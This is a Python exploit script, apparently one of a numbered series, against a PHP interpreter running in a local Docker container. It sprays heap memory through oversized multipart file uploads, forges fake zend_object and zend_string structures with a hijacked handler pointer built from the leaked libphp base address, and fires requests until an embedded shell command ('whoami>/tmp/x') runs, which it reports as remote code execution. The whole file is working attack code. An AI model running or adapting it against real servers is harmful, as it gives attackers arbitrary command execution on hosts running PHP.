#!/usr/bin/env python3
"""oom100: fix the three payload bugs that made oom99 fires silent.

99h evidence: probe measured V live, fires all 200-Fatal with NO crash.
No-crash = walk read an IS_UNDEF slot and skipped. Root causes found:
  1. pointer run was VA-aligned (off = 2 mod 8): walk slot V+56 hit
     zeros -> IS_UNDEF -> skip. LAW: run must cover EVERY 8-byte offset
     (self-typing: next pointer's low byte is 0x08 + flags bit = the
     0x108-analogue type_info) -- the oom93/98f-proven all-pattern.
  2. num_args packed at +0x28; disassembly-verified offset is +0x2C.
  3. gs_block <IIQ> put ti=0,h=13 (no len); correct zend_string header
     is <IIQQ>(1, 0x106, 0, 13) = 24 bytes, then the command bytes.
Everything else kept from oom99 (tiny probe, one worker, marker tile).
"""
import struct, subprocess, time, re, urllib.request, urllib.error

HOST = "http://127.0.0.1:8081"
OUT = lambda s: print(s, flush=True)

def sh(cmd, timeout=90):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout).stdout.strip()

def get(url, timeout=30):
    try:
        return urllib.request.urlopen(url, timeout=timeout).read().decode("utf8", "replace")
    except Exception as e:
        return "ERR %s" % e

def post(body, timeout=90):
    req = urllib.request.Request(HOST + "/oom_sapi.php", data=body)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return str(r.status), r.read(120)
    except urllib.error.HTTPError as e:
        return str(e.code), e.read(120)
    except Exception as e:
        return "ERR", repr(e).encode()

BASE = None
for ln in sh("docker exec php_vuln sh -c 'cat /proc/1/maps'").splitlines():
    if "libphp.so" in ln:
        BASE = int(ln.split("-")[0], 16)
        break
OUT("    libphp=0x%x" % BASE)
assert BASE and BASE > 0x7f0000000000

ZIF = 0x39b8a0
TILE = 176
BOFF = 384                    # 8-aligned BLOCK offset in the tile
MOFF = BOFF + TILE            # marker offset (560)
MARKER = b"ZAIMZAIM" * 24

def gs_block():
    hdr = struct.pack("<IIQQ", 1, 0x106, 0, 13)   # rc, ti, h, len=13
    return hdr + b"whoami>/tmp/x\x00" + b"\x00" * ((-(24 + 14)) % 8)

def obj_block():
    B = bytearray(TILE)
    struct.pack_into("<II", B, 0x00, 1, 0x108)    # rc=1, ti=0x108 (skip dtor)
    struct.pack_into("<II", B, 0x08, 1, 0)        # handle=1, pad
    struct.pack_into("<Q",  B, 0x10, 0)           # ce (never read: DC set)
    struct.pack_into("<I",  B, 0x2C, 1)           # num_args=1 (frame offset!)
    return B

def build_tile(OBJ):
    T = bytearray(1537)
    for off in range(0, BOFF, 8):                 # EVERY 8-byte slot (law)
        struct.pack_into("<Q", T, off, OBJ)
    B = obj_block()
    B[0x18:0x20] = struct.pack("<Q", OBJ + 0x80)  # handlers -> table
    B[0x50:0x58] = struct.pack("<Q", OBJ + 0x68)  # arg value = gs
    B[0x58:0x5C] = struct.pack("<I", 6)           # arg type = IS_STRING
    G = gs_block()
    B[0x68:0x68 + len(G)] = G
    B[0x80:0x90] = struct.pack("<QQ", 0, BASE + ZIF)  # table[1] = free_obj
    T[BOFF:BOFF + TILE] = B
    T[MOFF:MOFF + 192] = MARKER
    return bytes(T)

def probe_small(needle):
    h = needle.hex()
    for a in range(6):
        out = get("%s?h=%s&chunk=262144&maxc=6" % (HOST + "/oom_probe.php", h), timeout=40)
        if out.startswith("ERR") or "Fatal" in out:
            time.sleep(0.5); continue
        m = re.search(r"R=(\d+) d=([0-9a-f ]+)", out)
        if m:
            offs = [int(x, 16) for x in m.group(2).split()]
            if offs:
                return offs
    return None

def aim_body(tile):
    parts = []
    parts.append(b"------X\r\nContent-Disposition: form-data; name=\"p0\"; filename=\"%s\"\r\n"
                 b"Content-Type: text/plain\r\n\r\n%s\r\n" % (b"a" * 1525, tile))
    for i in range(1, 3400):
        parts.append(b"------X\r\nContent-Disposition: form-data; name=\"p%d\"; filename=\"%s\"\r\n"
                     b"Content-Type: text/plain\r\n\r\n%s\r\n" % (i, b"a" * 1525, b"A" * 1537))
    parts.append(b"------X--\r\n")
    return b"".join(parts)

def check_x(tag):
    x = sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'")
    if "No such" not in x:
        OUT("    *** %s: /tmp/x EXISTS: %r" % (tag, x))
        return True
    return False

# ================= boot cycle =================
for i in range(50):
    post(aim_body((b"WARMUPX" * 192 + b"W" * 400)[:1537]))
offs = probe_small(b"WARMUPX" * 24)
OUT("    probe offs=%s" % (offs[:4] if offs else None))
assert offs, "no sentinel region"
V = offs[0]
OUT("    V=0x%x" % V)

OBJ = V + BOFF
OUT("    OBJ=0x%x (BOFF=%d)" % (OBJ, BOFF))
tile = build_tile(OBJ)

# 3. sacrifice (aim tile, same-size request -> tile lands at V)
code, resp = post(aim_body(tile))
OUT("    sacrifice: %s %r" % (code, resp[:50]))

# 4. hammer
for fi in range(4):
    code, resp = post(aim_body(tile))
    OUT("    fire%d: %s" % (fi, code))
    if check_x("fire%d" % fi):
        OUT("*** RCE CONFIRMED ***")
        break
    if code == "ERR":
        time.sleep(3)
OUT("done; /tmp/x=%s" % sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'"))
